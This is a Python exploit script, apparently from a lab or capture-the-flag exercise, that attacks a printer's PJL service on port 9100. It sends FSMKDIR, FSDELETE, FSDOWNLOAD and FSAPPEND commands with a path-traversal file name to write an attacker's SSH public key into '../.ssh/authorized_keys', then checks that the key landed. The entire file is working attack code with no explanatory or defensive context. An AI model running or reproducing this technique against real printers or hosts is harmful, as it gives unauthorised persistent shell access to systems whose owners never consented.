#!/usr/bin/env python3
"""Paperwork pivot — correct PJL (FSUPLOAD=read, FSDOWNLOAD FORMAT:BINARY=write)."""
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def send_only(payload: bytes) -> None:
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        print(repr(s.recv(512)))
    except socket.timeout:
        print("T")
    s.close()


# prep
for cmd in (
    b'@PJL FSMKDIR NAME="../.ssh"\r\n',
    f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode(),
):
    s = socket.socket()
    s.settimeout(4)
    s.connect(("127.0.0.1", 9100))
    s.sendall(cmd)
    try:
        print("prep", repr(s.recv(256)))
    except socket.timeout:
        print("prep T")
    s.close()

# A) write via FSDOWNLOAD FORMAT:BINARY (inverted semantics on this box)
hdr_a = f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE={N} NAME="{PATH}"\r\n'.encode()
print("A", end=" ")
send_only(hdr_a + KEY)

# B) FSAPPEND NAME line + SIZE line + body — single sendall, NO recv between
payload_b = f'@PJL FSAPPEND NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY
print("B one-shot", end=" ")
s = socket.socket()
s.settimeout(8)
s.connect(("127.0.0.1", 9100))
s.sendall(payload_b)
try:
    print(repr(s.recv(512)))
except socket.timeout:
    print("T")
s.close()

s = socket.socket()
s.settimeout(5)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", s.recv(1024))
s.close()